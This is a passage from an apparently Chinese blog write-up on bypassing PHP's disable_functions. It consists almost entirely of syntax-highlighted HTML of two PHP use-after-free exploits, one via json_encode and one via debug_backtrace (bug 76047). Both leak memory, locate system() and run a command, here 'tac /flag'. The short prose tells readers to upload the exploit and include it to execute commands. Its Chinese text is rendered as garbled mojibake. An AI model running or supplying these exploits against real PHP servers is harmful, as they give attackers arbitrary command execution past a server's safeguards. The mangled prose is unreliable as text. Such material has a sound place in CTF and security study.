class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">8</span>, <span class="number">10</span>); <span class="comment"># zval type (reference)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># look for binary base</span></span><br><span class="line">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$handlers</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse elf header</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get basic_functions address</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># find system entry</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># copy hashtable offsetGet bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_off</span> = <span class="number">0x70</span> * <span class="number">5</span> - <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$function_data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_data</span> + <span class="number">0x40</span> * <span class="number">4</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_addr</span> = <span class="variable">$abc_addr</span> + <span class="variable">$fake_bkt_off</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>, <span class="variable">$fake_bkt_addr</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">3</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x58</span> + <span class="variable">$i</span> * <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy bucket zval</span></span><br><span class="line">        <span class="variable">$function_zval</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">12</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc,  <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_zval</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pwn</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="number">0x30</span>, <span class="variable">$zif_system</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>, <span class="variable">$fake_bkt_addr</span> + <span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span>-&gt;<span class="title function_ invoke__">offsetGet</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$y</span> = [<span class="keyword">new</span> <span class="title function_ invoke__">Z</span>()];</span><br><span class="line"><span class="title function_ invoke__">json_encode</span>([&amp;<span class="variable">$y</span>]);</span><br></pre></td></tr></table></figure><p>‰∏ä‰º†Ëøô‰∏™expÁÑ∂ÂêéÂåÖÂê´ÊâßË°åÂëΩ‰ª§Âç≥ÂèØ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703244.png" alt="image-20231206170321129"><br>‰πüÂèØÊèí‰ª∂Áõ¥Êé•Áî®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703867.png" alt="image-20231206170329807"></p><h2 id="Âà©Áî®Backtrace-UAF"><a href="#Âà©Áî®Backtrace-UAF" class="headerlink" title="Âà©Áî®Backtrace UAF"></a>Âà©Áî®Backtrace UAF</h2><h3 id="Âà©Áî®Êù°‰ª∂-10"><a href="#Âà©Áî®Êù°‰ª∂-10" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h3><ul><li>Linux Êìç‰ΩúÁ≥ªÁªü</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li><li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li></ul><h3 id="Âà©Áî®ÊñπÊ≥ï-5"><a href="#Âà©Áî®ÊñπÊ≥ï-5" class="headerlink" title="Âà©Áî®ÊñπÊ≥ï"></a>Âà©Áî®ÊñπÊ≥ï</h3><p>ÂéüÁêÜ‰πüÊòØpwn<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">EXP</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;tac /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span 